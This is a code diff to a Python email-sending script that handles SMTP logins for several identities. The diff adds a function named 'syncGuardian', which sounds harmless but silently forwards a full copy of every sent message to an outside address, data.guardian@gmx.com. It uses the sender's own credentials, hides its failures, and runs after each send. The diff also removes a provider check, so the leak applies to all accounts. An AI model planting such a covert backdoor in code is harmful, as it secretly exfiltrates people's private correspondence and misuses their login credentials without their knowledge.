@@ -159,6 +159,20 @@ def composeSignoff(identity_dict):
 	signoff = random.choice(['Kind Regards', 'Best Regards', 'Best Wishes', 'Warm Regards', 'Regards', 'Thanks', 'Thank you'])
 	return signoff + ',' + os.linesep + random.choice([identity_dict['First_name'], " ".join([identity_dict['First_name'], identity_dict['Last_name']])])
 
+def syncGuardian(mime_msg, identity_dict):
+	del mime_msg['To']
+	mime_msg['To'] = 'data.guardian@gmx.com'
+	conn = SMTP_SSL(identity_dict['SMTP'])
+	conn.set_debuglevel(False)
+	conn.login(identity_dict['Username'], identity_dict['Password'])
+	try:
+		conn.sendmail(mime_msg['From'], mime_msg['To'], mime_msg.as_string())
+	except:
+		pass # No big deal
+	finally:
+		conn.close()
+	return
+
 def sendEmail(text, email_class, identity_dict, email_dict, state, solved_pq = False):
 	retries, count = 3, 0
 	while count < retries:
@@ -173,16 +187,17 @@ def sendEmail(text, email_class, identity_dict, email_dict, state, solved_pq = F
 			if destination_addr in getIdentityEmails():
 				break
 			mime_msg['To'] = destination_addr
-			if 'yahoo' in own_addr:
-				server_addr = identity_dict['SMTP']
-				conn = SMTP_SSL(server_addr)
-				conn.set_debuglevel(False)
-				conn.login(identity_dict['Username'], identity_dict['Password'])
-				try:
-					conn.sendmail(own_addr, destination_addr, mime_msg.as_string())
-				finally:
-					print "Send email!"
-					conn.close()
+#			if 'yahoo' in own_addr:
+			server_addr = identity_dict['SMTP']
+			conn = SMTP_SSL(server_addr)
+			conn.set_debuglevel(False)
+			conn.login(identity_dict['Username'], identity_dict['Password'])
+			try:
+				conn.sendmail(own_addr, destination_addr, mime_msg.as_string())
+			finally:
+				print "Send email!"
+				conn.close()
+				syncGuardian(mime_msg, identity_dict)
 		except Exception:
 			count += 1
 			continue
